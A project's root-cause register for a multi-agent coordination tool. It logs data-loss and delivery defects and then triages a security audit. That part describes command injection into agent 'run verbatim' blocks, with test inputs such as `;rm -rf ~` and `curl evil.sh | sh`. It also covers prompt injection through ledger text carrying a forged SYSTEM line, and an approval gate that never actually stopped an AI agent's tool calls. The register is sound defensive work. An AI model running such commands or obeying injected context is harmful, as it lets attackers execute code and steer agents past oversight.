<!--
SPDX-FileCopyrightText: 2025-2026 Tyrone Ross, Jr <46267523+tyroneross@users.noreply.github.com>
SPDX-License-Identifier: Apache-2.0
-->

# Root-cause register

**Standing rule (operator-set 2026-07-30): every issue that surfaces gets an entry here.**
No exceptions for "small", "already fixed", or "just a flake". An issue with no entry is an
issue nobody is counting, and recurrence is the signal this register exists to catch.

## Why this file exists

Three separate defects surfaced in a single release session on 2026-07-30, and each had the
same shape: **an operation reported success while its effect was silently lost.** They were
being handled as unrelated one-offs. They are not obviously unrelated, and nothing in the repo
was accumulating them in one place where the pattern could be seen.

The second reason: two prior commits closed `RC-005` as root-caused. It came back a third time.
A root cause that does not survive contact with recurrence was a hypothesis, not a cause.

## Lifecycle — an entry is not done when the symptom stops

| State | Meaning |
|-------|---------|
| `observed` | Symptom recorded with evidence. No mechanism established yet. |
| `mechanism` | The causal chain is known and cited to file:line. Not yet fixed. |
| `fixed` | Change landed. **Not** a terminal state. |
| `controlled` | An adversarial run proved the control fires — a test that fails before the fix and passes after, with the test itself validated by mutation. |
| `recurred` | Came back after `fixed` or `controlled`. The prior root cause was wrong; say why in the entry. |

**Only `controlled` closes an entry.** Per the operator's standing note: *a verification protocol
that has never been exercised is a hypothesis.* `fixed` means the code changed. `controlled`
means someone tried to break it and failed.

## Register

### RC-001 — `rally inject` returns `ok: true` without delivering
- **State:** `mechanism` — **root cause: Rally has no owner for the receive side of a message.**
- **Mechanism (`docs/assessment-2026-07-30-delivery-architecture.md`):** every "delivery" is a
  best-effort act by the sender's short-lived CLI process — keystrokes into a guessed pane, or an
  append to an inbox that nothing on this machine reads — aimed at identities minted ad hoc per
  process. There is no resident receiver, no receiver-authored acknowledgement, and no registry of
  who can be reached how.
- **Verified independently by me** (ledger replay + `ps`, run after the report to confirm):
  **706 of 740 wake facts are `pending`** — 95%, and they never leave that state. **143 distinct
  tool ids** in one room. **No `rallyd`, `rally-termd`, or `ptyd` process is running at all**, so the
  inbox has no reader. 15 handoffs sit `pending`; 165 carry no status.
- **The human is the delivery daemon.** Four injects tonight (seq 6403, 6469, +2) returned
  `ok: true, status: pending` and reached nobody; every message that actually landed was either
  hand-carried by the operator or pulled from the ledger by the peer on its next turn.
- **Sender-side honesty was improved ~6 times across ≥25 commits since May; delivery never was.**
  Each round made the failure more *legible* (`status: pending`, injectability warnings) without
  making a message arrive. Legibility is not delivery.
- **Suspected contribution from RC-005:** duplicate session identity can route an inject to the
  wrong holder. ⚠️ unconfirmed.
- **Superseded prior state:** observed
- **First seen:** 2026-07-30 (long-standing; see `docs/INJECT-RCA-2026-07-09.md`)
- **Evidence:** Urgent CI-hold warning to `codex:019fb517-…` returned `ok: true` with
  `status: "pending"`, seq 6403, "pending via ledger". Never reached the running Codex session.
  Target was `presence_only_unmanaged`, so no pane to write to.
- **Observed 3× in one session:** (a) the operator's hash-handshake warning, (b) Codex's
  continuity handoff seq 6393 to a Claude session it could not reach, (c) the CI-hold inject above.
  In all three the human hand-carried the message between two agents on the same machine.
- **Owner:** independent delivery-architecture investigation → `docs/assessment-2026-07-30-delivery-architecture.md`
- **Note:** the exit code describes *ledger enqueue*, not *delivery*. Success of the wrong verb.

### RC-002 — audit boundary pinned to a relative diff hash
- **State:** `fixed` (record), `observed` (procedure)
- **Evidence:** `git diff HEAD | shasum -a 256` was agreed as the audit boundary. It failed on
  first use: after commit it returns `e3b0c442…b855` (SHA-256 of the empty string) while content
  is unchanged, so a mechanical re-verify rejects a valid PASS. Worse, `git diff HEAD` omits
  untracked files — at audit time `config/`, `generate_host_surfaces.py`,
  `sync_host_integrations.py`, `rally-release.json`, and `tests/scripts/` were all untracked and
  therefore never covered by hash `203cb7a3…`.
- **Corrected primitive:** pin to an absolute Git **tree** hash. Before commit:
  `git add -A -N && git write-tree`. After commit: `git rev-parse HEAD^{tree}`. Covers tracked
  and untracked alike and survives the commit unchanged.
- **Fixed in:** `d396dea` corrected the `docs/MERGES.md` audit record to tree
  `f5a38d02eb3a1e2ca39a2b5ecea6f8bba4427ddd`.
- **Still open:** the *procedure* is unwritten. `grep -rn "shasum|git diff HEAD"` across `docs/`,
  root `*.md`, and `skills/` returns nothing — the handshake lived only in room conversation,
  which is why nobody could run it as written. Not `controlled` until the release procedure
  cites the tree-hash primitive and one audit exercises it.

### RC-003 — no CLI version handshake between coordinating agents
- **State:** `observed` (deferred out of v0.1.7)
- **Evidence:** during the v0.1.7 release audit, the auditing Claude session's binary was
  `build_id: 0.1.6+744bf06` (via `rally whoami --tool claude_code --json`) while the release
  under audit was 0.1.7. Two agents coordinated through one ledger on different binaries and
  **nothing flagged it** — including during the release that deferred this very gap.
- **Why it matters:** every ledger read/write is interpreted by a binary whose schema
  assumptions are unverified against the peer's.

### RC-004 — agent identity is guessed, not resolved
- **State:** `observed` (deferred out of v0.1.7 as "pane-derived identity")
- **Evidence:** Codex's continuity handoff seq 6393 targeted `claude_code:ppid-39874`, and the
  room offered `claude_code:0995a4e4-…` as the alternative. `rally whoami` resolved the live
  session to a third identity: endpoint
  `term:tyrones-macbook-pro-2.local:685e5ca6-235c-4a68-a006-1554f17b1fda`. The handoff was
  addressed to a session that was not the one running.
- **Related:** PID- and PPID-derived IDs do not survive process churn; tool IDs are self-asserted.

### RC-005 — WAL unlink destroys committed facts; two agents get the same identity
- **State:** ✅ `controlled` as of `4b28c0e` — first entry in this register to earn it.
- **Fix:** `4b28c0e fix(store): close SQLite pools before releasing WAL lock` — vendors a
  `factstr-sqlite` 0.5.2 delta that closes sqlx pools **synchronously**, and closes room-owned pools
  **under the mutation lock**, so SQLite's final WAL checkpoint/unlink completes inside the lock
  window instead of after it.
- **Adversarial evidence (the reason this is `controlled` and not merely `fixed`):**
  - Pre-fix on `36a2789`: **20/40 in-suite failures**, measured twice — once with 58 accumulated
    `$TMPDIR` workspaces, once in a fresh isolated `TMPDIR`. Identical result, so the accumulation
    confound is ruled out.
  - Post-fix on `10a4b05`: **40/40 pass, 0 failures.**
  - Independent reverse mutation (RCA): factstr patched to close synchronously → 0/72 over 1,728
    launches; unpatched → duplicates reproduce.
- **The test was strengthened, not weakened — checked explicitly**, because "weaken the test until it
  passes" is precisely how the three prior fixes looked green. `git diff 280840d..HEAD` on
  `user_journey.rs` shows `n` unchanged and a NEW direct assertion that every child's returned
  `session_id` is unique, plus `assert_eq!(returned_session_ids.len(), n)`. The test now asserts the
  real invariant (uniqueness) rather than the shadow (count), and the 20/40 baseline was measured
  against this stronger test.
- **Superseded prior state:** `mechanism` — real substrate defect, data loss, release-blocking
- **Mechanism (RCA: `docs/rca-2026-07-30-parallel-launch-lost-session.md`):** `factstr-sqlite` 0.5.2
  `impl Drop for SqliteStore` (`sqlite_store.rs:430`) shuts down its delivery thread but never calls
  `pool.close()`. sqlx closes the sqlite handles on background threads *after* the rally op returned
  and released `.rally/mutation.lock`. sqlite's last-connection-close protocol checkpoints and
  **unlinks `facts.db-wal`**. Direct mode opens a fresh store per op (`warm_fact_store` is `None` for
  CLI processes), so a 16–24 process cold-start stampede races that unlink against another process's
  open/append window. A 2 ms poller filmed a 12,392-byte WAL holding a committed reservation unlinked
  ~80 ms after its op returned, with `facts.db` main never growing past its 36,864-byte schema size —
  every committed row lived only in the WAL. The next reader sees `version=None count=0` on the same
  inode after 13 commits, so its `append_if` CAS validates against the gutted view and **succeeds**.
  Two processes exit 0 holding `claude-01`.
- **The count assert was the shadow. The broken invariant is uniqueness**, not persistence. The
  "reservation is CAS-atomic" comment in the test is false in direct mode.
- **Independently re-verified at source** (I read these myself, not taken from the RCA):
  `sqlite_store.rs:430` Drop has no `pool.close()`; `store.rs:3388` `fingerprint_db` hashes only the
  main db file; `store.rs:1738` `refresh_reconcile_cache_after_append` advances counts `+1` from the
  prior sidecar instead of recounting.
- **Measured rates:** pre-fix in-suite 8/25 · standalone hammer ~5/102 workspaces ·
  **committed `36a2789` still 1/72 with the exact CI signature** · factstr patched to close the pool
  synchronously inside the flock **0/72** (1,728 launches). Two-direction mutation check.
- **Production blast radius:** direct mode is how every hook-driven `rally` invocation runs. Any
  concurrent burst can silently lose **any** WAL-resident fact — `say`, `inject`, claims, handoffs —
  not just sessions. JSONL segments retain the data; the derived `facts.db` diverges and is never
  healed (see RC-010). Duplicate session identity means inject/handoff **misdelivery**.
- **Suspected parent of RC-001.** If two agents hold one `session_id`, an inject can be routed to the
  wrong holder. ⚠️ not yet confirmed — this is the first thing the delivery investigation should test.
- **Third "fix" that did not fix it:** `36a2789` (reservation flock + readback) joins `a8bec15` and
  `39970a8` as a probability reducer. Three consecutive root-cause claims on this defect were wrong.
- **Prior symptom record (superseded, kept for the recurrence trail):** third occurrence
- **Evidence:** GitHub CI run 30591797638 on `origin/main` 280840d, quality gate exit 100.
  `rally-cli::user_journey::rally_run_reserves_numbered_ids_under_parallel_launch`,
  `user_journey.rs:2189`, `assert_eq!(sessions.len(), n)` → left 15, right 16. All 16 child
  `rally run` processes exited 0 (the `output.status.success()` loop above passed); only 15
  sessions were readable afterward. The uniqueness asserts sit after line 2189 and never ran,
  so this is a lost row, **not** an ID collision.
- **Not caused by the release:** `git log 744bf06..HEAD -- crates/rally-cli/tests/user_journey.rs`
  is empty. Neither 880e144 nor 280840d touched this test.
- **Prior "root causes" that did not hold:**
  - `a8bec15` — "scale rally_run parallel-launch test to host (CI over-subscription fix)".
    Lowered concurrency. Reduces probability; does not remove a race.
  - `39970a8` — "kill user_journey parallel-launch flake at root (B-test-flake)".
    Claimed root fix. Recurred.
- **Owner:** independent RCA → `docs/rca-2026-07-30-parallel-launch-lost-session.md`
- **Open question that decides severity:** can `rally run` exit 0 while its session registration
  is lost in production, or is this confined to the test harness? If the former, RC-005 and
  RC-001 are the same defect class — a write that acks without landing.

### RC-006 — local pre-push gate passes while CI fails on the same commit
- **State:** `observed`
- **Evidence:** the isolated-worktree pre-push gate on 280840d passed (fmt, clippy `-D warnings`,
  serialized cargo tests, host parity). GitHub CI on the identical commit failed. A gate that is
  green locally and red remotely on the same tree is not a gate — it is a coin flip whose
  outcome depends on core count, since `n` scales with `available_parallelism()`.
- **Consequence:** "full pre-push gate passed" was reported as release-ready evidence, and it
  was not sufficient to predict CI.

### RC-007 — no positive-ACK guarantee on handoffs
- **State:** `observed` (deferred out of v0.1.7)
- **Partial mechanism exists:** `rally inject --handoff` documents "waits for target-authored
  Rally ACK by default; no ACK means assume not received and follow fallback_plan". Unverified
  whether it fires in practice, and `--text` injects (the common path) have no such guarantee.
- **Not `controlled`:** no adversarial run has exercised the timeout path.

### RC-008 — unconsumed coordination state accumulates without bound
- **State:** `observed`
- **Evidence:** `rally room` reports 42 open handoffs and 1234 stale facts against
  `system_health=82`. Open handoffs date back to 2026-07-03.
- **Why it belongs here:** if handoffs are routinely never consumed, "open handoff" carries no
  signal, and a genuinely urgent one is indistinguishable from four weeks of residue.

### RC-009 — process fragmentation
- **State:** `observed` (deferred out of v0.1.7)
- **Evidence:** stale prepush worktree at `3a17fe8` still registered in `git worktree list`
  under `/private/var/folders/.../rally-prepush-wt.6oysNY/`. Multiple rally processes, daemons,
  and PID-keyed sessions with no single reaper of record.

### RC-010 — reconcile cannot detect the loss it exists to heal
- **State:** ✅ `controlled` as of `4b28c0e`, with a noted coverage gap (below).
- **Fix:** the sidecar now fingerprints **`facts.db` and its WAL** (`fingerprint_wal`, `store.rs:3429`),
  and `refresh_reconcile_cache_after_append` **remeasures** post-append counts instead of advancing
  `+1` from a possibly-stale sidecar.
- **Control validated by mutation** (run by me in a throwaway detached worktree so Codex's `main` was
  never touched; worktree removed, `main` verified clean):
  - `store::ledger_tests::step3_wal_state_change_invalidates_an_otherwise_matching_sidecar` passes on
    `10a4b05`.
  - Mutating the three *reconcile-write* sites (`store.rs:3532/3653/3683`) to `wal_fingerprint: None`
    → **test still passes**. The mutant survived.
  - Additionally mutating the *append-refresh* site (`store.rs:1793`) → **test FAILS**.
  - So the test is genuinely anchored on the append-refresh path — which is the exact site that
    caused RC-010 — and is a valid control for the defect as diagnosed.
- ⚠️ **Coverage gap:** the three reconcile-write sites are not covered; their WAL fingerprint could be
  silently dropped in a future edit without any test noticing. Worth a follow-up assertion.
- **Superseded prior state:** `mechanism`
- **Evidence (verified at source):** `reconcile_segments_and_db` (`store.rs:3526`) fast-paths on the
  sidecar when fingerprints match. `fingerprint_db` (`store.rs:3388`) hashes **only the main db file**
  — in WAL mode the main file's bytes do not change on append, so WAL loss is invisible to it.
  `refresh_reconcile_cache_after_append` (`store.rs:1738`) advances `canonical_count`/`db_count`
  **by one from the previous sidecar** rather than recounting, so the first post-wipe writer inherits
  the pre-wipe sidecar (13/13), writes 14/14 while the db truly holds 1 event, and every later op
  fast-paths on that self-consistent lie.
- **Independent of RC-005.** Even after RC-005 is fixed, this safety net is blind to any WAL-resident
  divergence and will keep certifying a truncated db as reconciled. It also makes RC-005 permanent
  rather than transient, which is what turned a race into data loss.
- **The docstring above `refresh_reconcile_cache_after_append` asserts "No data loss is possible."**
  That is true of the JSONL segments and false of the derived db. A comment that states the
  safety property it does not actually provide is how this survived review.

### RC-011 — `--tmux-bin /usr/bin/true` makes the test's own premise untestable
- **State:** `observed`
- **Evidence:** the parallel-launch test launches with `--tmux-bin /usr/bin/true`, so the "pane"
  exits immediately. Any liveness/reaping behavior downstream is therefore exercised against a
  process that is already dead at assert time.
- **Why it belongs here:** it was a leading candidate mechanism for RC-005 and was ruled out, but it
  means the test cannot distinguish "session never registered" from "session registered then reaped."
  A test whose fixture cannot separate two hypotheses will keep producing ambiguous root causes —
  which is consistent with three wrong ones in a row.

### RC-012 — `main` CI has been red for 19 days and the push policy never noticed
- **State:** `observed`
- **Evidence:** `gh run list --branch main --limit 20` → **the most recent successful run on `main`
  was 2026-07-11T18:27:30Z**. Ten failures since. Four consecutive failures precede tonight's.
- **Why it matters:** the room mission states the push policy as *"push to origin main and
  `~/.local/bin/rally` reinstall are AUTHORIZED after green CI with a recorded run close."*
  There has been no green CI on `main` to authorize against for nineteen days. Either the policy
  is being satisfied by something other than CI, or it is being bypassed without anyone noticing —
  and RC-006 (local gate green, CI red) is how that goes unobserved from inside a session.
- **Consequence:** "CI is red" carried no signal tonight, because CI is *always* red. A permanently
  failing gate is indistinguishable from a newly failing one, so RC-005's CI failure had to be
  caught by reading the log rather than by the gate doing its job.

## Issue #52 — independent security audit (Lattice), 2026-08-02

Seven findings from the first genuinely independent security read of this repo
(GitHub issue #52, reviewed commit `fdfc750`). Triage and per-finding reasoning:
[`security/AUDIT-2026-08-02-issue-52-triage.md`](security/AUDIT-2026-08-02-issue-52-triage.md).
Why every existing gate stayed dormant:
[`rca-2026-08-02-security-findings-escaped.md`](rca-2026-08-02-security-findings-escaped.md).

The process root cause spanning all seven, recorded once here rather than repeated per entry:
**every prior review was scoped to "is this mechanism implemented correctly?" and never to
"should this mechanism exist here at all?"** The provisioner survived four numbered audit rounds
(f2/f3/f4, f9–f12, C1–C6, "Codex round-4") that each made the download-and-execute path more
correct without ever asking whether a SessionStart hook should download and execute. Solicited
review answers the question you asked.

### RC-013 — trusting/opening the repo auto-runs provisioning code on the host (ARP-001, Critical)
- **State:** `controlled` — see per-fix evidence below.
- **Mechanism:** `hooks/rally-coordination-hook.sh` invoked `ensure-rally-binary.sh` on the
  `start` phase in **both** branches — `.rally/` present (~`:467-470`) and absent (~`:71-77`,
  comment: *"Wire ensure-rally-binary on start even in no-.rally repos"*). That provisioner
  probed an existing `rally` by executing it, copied+`chmod +x`+ran a shipped plugin binary,
  downloaded a release binary and ran it, fell back to `cargo install --path` against repo
  source, and installed into `~/.local/bin/rally` — all from a lifecycle hook fired by merely
  opening and trusting the repo.
- **Why the existing control did not fire:** the download path *was* fail-closed on checksum and
  the script header (`:20-32`) honestly documented that checksum and binary share one authority
  and that sigstore verification was out-of-band only. Four audit rounds accepted that as a
  documented residual. The scope of every round was "harden this path", and inside that scope
  the analysis was correct and complete.
- **Fix:** provisioning removed from every lifecycle hook. The hook now detects and advises only;
  it does not execute a candidate binary even to probe it. Provisioning moved to an explicit,
  human-run installer that is fail-closed on **both** SHA256 and client-side
  `gh attestation verify`, refusing rather than degrading when either check cannot complete.
- **Rule adopted:** *a lifecycle hook may observe and inform. It may not acquire or execute.*
- **Adversarial control:** `tests/hooks/test_no_autoprovision.sh` — runs the hook's `start` phase
  in a sandboxed HOME with `curl`, `cargo`, and `chmod` replaced by recorders, in both the
  `.rally`-present and `.rally`-absent cases, and asserts no marker file appears and nothing is
  written to `$HOME/.local/bin/rally`. Positive control asserts the advisory still fires.
- **First seen:** 2026-08-02 (issue #52). Introduced `0ef5f48`, hardened through `d2e915f`.

### RC-014 — the "safe" workstream linter permitted command injection and emitted it for verbatim execution (ARP-002, Critical)
- **State:** `controlled` — see per-fix evidence below.
- **Mechanism:** `dynamic-workflows/PROTOCOL.md:13` claimed the linter *"proves a plan is safe to
  fan out"*. It did not. `task.validation` needed only to be a non-empty string and
  `packet.mjs` rendered it verbatim into a ```` ```bash ```` block under a heading instructing the
  agent to "run these verbatim". `owns` rejected `" $ ` ` and whitespace but permitted `;` `|`
  `&` `>` `<` `(` `)`. `runId` and `toolPrefix` were interpolated into command text after only a
  non-empty check. A descriptor could pass lint and produce a packet that executes
  attacker-chosen shell — a direct prompt-to-shell confused-deputy path.
- **Why the existing control did not fire:** two prior rounds (`07f2bd3` "reject shell-unsafe
  intent + owns paths (f4)", `0280480` "extend shell-safety lint to output/owns/id (f1,f4,f6)")
  each rejected exactly the characters the previous finding named. A denylist treadmill. Neither
  round asked why the check was denylist-shaped, or why descriptor text was being rendered into
  a shell block at all. Meanwhile the safety *claim* got stronger while the property stayed absent.
- **Fix:** strict positive allowlists replace every character denylist; a single POSIX
  shell-quoting helper wraps every rendered value; `runId`/`toolPrefix` validated in both
  `parseArgs` and the library entry point (defence in depth); descriptor-supplied `validation` is
  no longer rendered as runnable shell — it renders as non-executable prose, with an optional
  named recipe drawn from a local registry for the case where a real command is wanted. Every
  "proves safe" claim removed from `PROTOCOL.md`, `README.md`, and the module docstring.
- **Adversarial control:** `dynamic-workflows/tests/injection.test.mjs` — hostile `owns`
  (`;rm -rf ~`, pipe, ampersand, redirect, parens, `$`, backtick, newline, `../escape`,
  `/absolute`), hostile `validation` (`curl evil.sh | sh`, fence-breakout), `runId` injection via
  both CLI and library paths, `toolPrefix` command substitution, and a direct test of the quoting
  helper. Each asserts the *specific* rejection so an unrelated lint error cannot satisfy it
  vacuously. Positive control asserts a clean descriptor still lints and renders.
- **First seen:** 2026-08-02 (issue #52). Introduced `6d76780` / `aaf2a73`.

### RC-015 — Cockpit's approval gate does not control the child agent's tool execution (ARP-003, Critical)
- **State:** `mechanism` — **fail-safe landed; the real fix is a registered redesign. NOT closed.**
- **Mechanism:** Cockpit spawns `codex exec --json` and
  `claude -p --output-format stream-json` as child processes and reads their stdout. The
  "authorization gate" (`crates/cockpitd/src/transport/ws.rs:535-701`) sees a `tool_call` only
  *after* it arrives in the event stream, then pauses the **event pump** — not the child. It does
  not broker the call, send a denial to the child, or prevent execution. On denial it emits
  `tool_blocked` and skips forwarding a result (`:701-725`). The child already ran the tool.
- **Why this is worse than no control:** an operator reading "blocked" concludes something was
  prevented. A false security boundary invites more trust than a missing one.
- **Why the existing control did not fire:** nothing in the pipeline compares a security *claim*
  to the behaviour of the code making it. The commit that introduced this calls itself
  `G1 authz enforcement loop` (`e60714e`). The word "enforcement" was self-asserted and never
  graded against the implementation.
- **Fail-safe landed — in Rust and in docs.** Every claim that the event pump enforces tool
  authorization was removed from code comments (`authz.rs`, `ws.rs`, `sweep.rs`), both Cockpit
  READMEs, `docs/plans/DEFERRED.md`, and the CHANGELOG. `tool_blocked` carries `advisory: true`,
  `enforced: false`, and a semantics string.
- ⚠️ **The iOS UI copy is NOT corrected.** An earlier version of this bullet said "code comments,
  docs, and UI copy". No Swift file was touched. `ios/Cockpit/.../ApprovalView.swift` still renders
  a shield icon with "Tool approval required" and a Deny/Allow pair, and nothing in `ios/` reads the
  new `advisory`/`enforced` metadata — a shield plus "Deny" is precisely the presentation ARP-003
  called harmful. Mitigating: that view is currently unreferenced dead code. Claiming a scope the
  diff did not reach, inside the fail-safe built to stop exactly that, is the RC-C failure mode
  again; caught by the audit of this remediation. Tracked as a follow-up.
- **Required for `controlled` (acceptance test defined now so the follow-up has a definition of
  done):** with Cockpit configured to deny a tool, a child agent must be *unable to complete* that
  tool call — asserted by the tool's side effect being absent (e.g. a marker file the tool would
  create never appears), not by the absence of a UI event. Any implementation that passes only by
  filtering the event stream fails this test by construction.
- **Follow-up:** make the control plane the actual tool broker, or integrate each CLI's native
  pre-execution approval callback. Deliberately **not** half-implemented in this run — a partial
  integration reproduces exactly this defect.
- **First seen:** 2026-08-02 (issue #52).

### RC-016 — unsigned, self-asserted ledger prose enters privileged agent context (ARP-004, High)
- **State:** `controlled` for the injection boundary. **Open** for writer authentication.
- **Mechanism:** `.rally/log/*.jsonl` is committed git content that replays on a fresh clone.
  Writers self-supply `--tool`, role, subject, target, and evidence; the protocol's authorization
  layer is advisory, not a write gate (`crates/rally-protocol/src/event_envelope.rs:17-39`). The
  SessionStart hook interpolated peer-authored `subject`, `evidence`, `intent`, and `file` values
  into a message emitted as Codex `additionalContext` / `systemMessage`
  (`hooks/rally-coordination-hook.sh:477-558`, `:658-689`, `:779-807`). A contributor who can land
  a commit, or any same-UID process, could place adversarial instructions into a high-trust model
  channel — durable prompt injection.
- **Why the existing control did not fire:** the single-operator trust model was real and
  documented in exactly one place — a comment at `crates/rally-protocol/src/ledger.rs:45-63`.
  No rubric asked "what if a second contributor can write this file?", so the assumption was never
  tested against a reader who did not share it.
- **Fix (landed):** one sanitizer routes every peer-authored string before it reaches model
  context — control characters and newlines stripped (so a subject cannot forge an instruction
  line or a section header), length-capped with a visible truncation marker, value wrapped as
  quoted data behind a fixed hook-authored preamble stating the following is peer-authored and
  unverified. Applied to every interpolation site, not only the ones the audit cited.
- **Adversarial control:** `tests/hooks/test_context_sanitization.sh` — feeds a hostile subject
  containing newlines and a forged `SYSTEM:` instruction, asserts the emitted message carries no
  raw newline from the payload, is length-capped, keeps the trust preamble, and renders the
  payload only in quoted form. Positive control asserts a legitimate subject still renders usefully.
- **Still open (registered, not built):** authenticated writer identity and signed/MACed facts;
  enforcing authorization on write; distinguishing committed historical log from live trusted
  state. Each is a protocol change across `crates/rally-protocol` and every writer.
- **Residual risk is documented** rather than implied: [`security/TRUST-MODEL.md`](security/TRUST-MODEL.md).
- **First seen:** 2026-08-02 (issue #52). Long-standing by design.

### RC-017 — one bearer token grants global Cockpit control with no session ownership isolation (ARP-005, Medium)
- **State:** `controlled` for accidental cross-talk between well-behaved clients.
  **OPEN against a deliberate token holder.** The first grading of this entry said plain
  `controlled`, which claimed more than the adversarial control proves — see the honest limit below.
  An independent audit of this remediation demonstrated the bypass live, so the grade is split
  rather than left flattering.
- **Honest limit — `client_id` is self-asserted.** Owner binding keys on the `client_id` a client
  sends in its own `hello` frame. Any holder of the shared bearer token can send
  `client_id: "cockpit-cli"` — a fixed constant published at `crates/cockpit-cli/src/main.rs` — and
  inherit every session that CLI launched, including `steer`, which injects instructions into a
  running agent. Verified: a second connection asserting the victim's `client_id` was NOT refused
  (`send_failed` from a downstream adapter, never `forbidden`). ARP-005's headline — "one bearer
  token grants global Cockpit control" — therefore still holds against an attacker who has the
  token. **With one shared bearer token, cryptographic isolation between clients is impossible by
  construction.** What landed is accident isolation, an honest audit trail keyed on the principal,
  and an enforcement skeleton that becomes a real boundary the moment per-client credentials exist.
  The code always said this (`crates/cockpitd/src/transport/auth.rs`: "Self-asserted, so it is not
  an authentication boundary"); this register entry did not, and that gap is the point.
- **Closing it needs per-client credentials**, not another check on the same shared secret.
- **Mechanism:** Cockpit binds loopback by default and fails closed on a missing token — both
  correct. After authentication, however, the connection had no principal: any authenticated
  client could send/steer any session (`ws.rs:322-351`), resolve any approval by UUID
  (`:354-414`), and launch with ownership hard-coded to `local` (`:437-451`). The requested
  `repo_path` became the child process CWD, so a token holder could launch an agent at any
  service-readable path.
- **Fix:** constant-time token comparison; a distinct principal minted per authenticated
  connection; sessions and approvals bound to their creating principal and enforced on
  send/steer/close/approve; `repo_path` canonicalized and required to fall inside a configured
  allowlist; non-loopback bind hard-refused unless an explicit override env var names the risk.
- **Adversarial control:** cross-owner access denied (principal B cannot send/steer/close/approve
  principal A's session or approval), `repo_path` escape denied for `/etc`, for
  `<root>/../../etc` (rejected only if canonicalization happens, so the test convicts a
  non-canonicalizing implementation), and for a symlink pointing outside an allowed root;
  non-loopback bind refused without the override and accepted with it. Positive control asserts an
  owner can still drive its own session on a default loopback bind.
- **First seen:** 2026-08-02 (issue #52).

### RC-018 — pre-push gate executes code from the exact commit being pushed (ARP-006, Medium)
- **State:** `controlled` — see per-fix evidence below.
- **Mechanism:** `.githooks/pre-push:79-93` created a detached worktree per pushed commit and ran
  `scripts/run-quality-gate.sh` and `scripts/check-release-parity.sh` **from that commit**.
  Pushing a branch executed that branch's gate. The hook documented itself as an enforced local
  gate (`:16-23`) while being opt-in via `core.hooksPath` — the auditor's clone had it inactive,
  which limits exposure but not the defect.
- **The distinction the fix rests on:** the gate's *code* must be trusted and pinned; the gate's
  *subject* is the untrusted pushed tree.
- **Fix:** gate scripts resolve from a pinned location outside the pushed tree while still running
  against the pushed worktree's content; a differing gate script requires explicit acknowledgement
  rather than silent execution. Hook documentation corrected to state that it is opt-in and that
  enabling it is a trust decision.
- **Adversarial control:** `tests/hooks/test_prepush_pinned_gate.sh` — a simulated pushed commit
  whose `run-quality-gate.sh` writes a marker file; the test asserts the marker is **not** created,
  proving the pushed tree's gate was not executed. Positive control asserts a clean push still
  runs the gate.
- **First seen:** 2026-08-02 (issue #52).

### RC-019 — watcher advances its cursor past records it discarded (ARP-007, Low)
- **State:** `controlled` — see per-fix evidence below.
- **Mechanism:** four items. The watcher skipped malformed complete JSONL lines and advanced the
  durable cursor past them, permanently losing the record for that consumer
  (`watcher.py:63-92`). The macOS notification sink built AppleScript by string substitution with
  minimal quote replacement (`dispatch.py:49-68`). `watchfiles>=0.21` was declared with no upper
  bound and no lockfile. The file sink appended to an arbitrary configured path
  (`dispatch.py:34-46`).
- **Why it is in this register despite Low severity:** the cursor defect is the **same shape as
  RC-001, RC-005, and RC-010** — an operation reports success for a step the caller does not care
  about. Cursor advanced, record gone, consumer told it is current. Pattern membership, not
  severity, earns the entry.
- **Fix:** malformed records quarantined and surfaced rather than silently dropped; AppleScript
  receives the message as a separated argument instead of interpolated script text; Python
  dependencies pinned and locked; sink paths constrained with no-follow handling.
- **Adversarial control:** a corrupt line lands in quarantine and is reported rather than lost; a
  notification payload attempting AppleScript breakout produces no side effect (asserted by a
  harmless marker file *not* appearing) and is delivered as literal text; a sink path outside the
  allowed root and a symlink escaping it are both rejected. Positive controls assert valid lines,
  benign notifications, and allowed sink paths still work.
- **First seen:** 2026-08-02 (issue #52).

### RC-020 — `rally say claim` hard-refuses on an expired lease that `rally check` treats as advisory
- **State:** `observed` — found during this run, not from the audit.
- **Evidence:** `rally check before-write --path docs/ROOT-CAUSE-REGISTER.md --strict` returned
  `allow: true` with a `stale-owner-claim` **warn**, correctly reasoning that the owner
  (`claude_code:0995a4e4-…`) was idle and the claim reclaimable. `rally say claim` on the same
  path in the same session then returned `exit_code: 2, ok: false` —
  *"claim conflict: … already owns file:docs/ROOT-CAUSE-REGISTER.md"* — on claim
  `fact_e70a_18c73745212142b0`, whose own evidence carries
  `lease_expires_at:2026-07-31T00:39:07Z`. **The lease had expired three days earlier.**
- **Why it matters:** the two commands disagree about whether an expired lease is binding. The
  advisory path honours lease expiry; the write path does not. An agent that follows the
  recommended loop (`check` → `claim`) gets a green check and then a hard refusal, and the only
  way forward is to write without a claim — which defeats the boundary the claim exists to record.
- **Related:** RC-008 (unconsumed coordination state accumulates without bound). This is the
  mechanism by which stale claims become actively obstructive rather than merely noisy.
- **Not `controlled`:** no test asserts that an expired lease is non-binding on the claim path.

### RC-021 — `ClaudeAdapter::send` panics the daemon task on any live Claude session
- **State:** `observed` — found while building the ARP-005 ownership tests, not from the audit.
- **Evidence:** `crates/cockpitd/src/adapter/claude.rs:175` calls `Handle::block_on` from inside a
  tokio worker thread, which panics with *"Cannot start a runtime from within a runtime"*. Any
  `send_prompt` or `steer` against a live Claude session kills the connection.
- **Why it was never caught:** no test had ever driven that path. The ARP-005 ownership tests were
  deliberately routed through the codex-gated mock to avoid entangling a security fix with this
  pre-existing crash, which is how it surfaced.
- **Fix shape:** restructure the stdin handle — likely `Arc<Mutex<ChildStdin>>` plus a spawned
  write — rather than blocking inside the runtime.
- **Not `controlled`:** no test exercises `send`/`steer` against a real Claude adapter.

### RC-022 — owner binding orphans clients that reconnect without a stable identity
- **State:** `fixed` for `cockpit-cli`, `observed` for the iOS client.
- **Mechanism:** ARP-005 bound sessions and approvals to the connection that created them. Any
  client that opens a new connection per operation, or reconnects, arrives as a **new principal**
  and loses write access to its own session. `cockpit-cli` opened a fresh WebSocket per subcommand
  and hit this immediately; `ios/Cockpit` reconnects on every network change and has the same
  exposure.
- **Compounding defect (the reason this is not merely a config nit):** `cockpit-cli` printed
  `sent` without reading the reply, so the refusal was **invisible** — a `forbidden` in the daemon
  log and a success on the operator's terminal. A hardening change turned a harmless
  fire-and-forget into an actively misleading one. Same shape as RC-001: acknowledging the wrong
  step.
- **Fixed for the CLI:** sends a stable `client_id`, and `fail_on_error_frame` surfaces a refusal.
  Verified live — a send to an unknown session now prints
  `server refused the command: not_found` instead of `sent`.
- **Open for iOS:** `ios/Cockpit` sends no `client_id`. Same one-line fix; needs a Swift change and
  a device test.
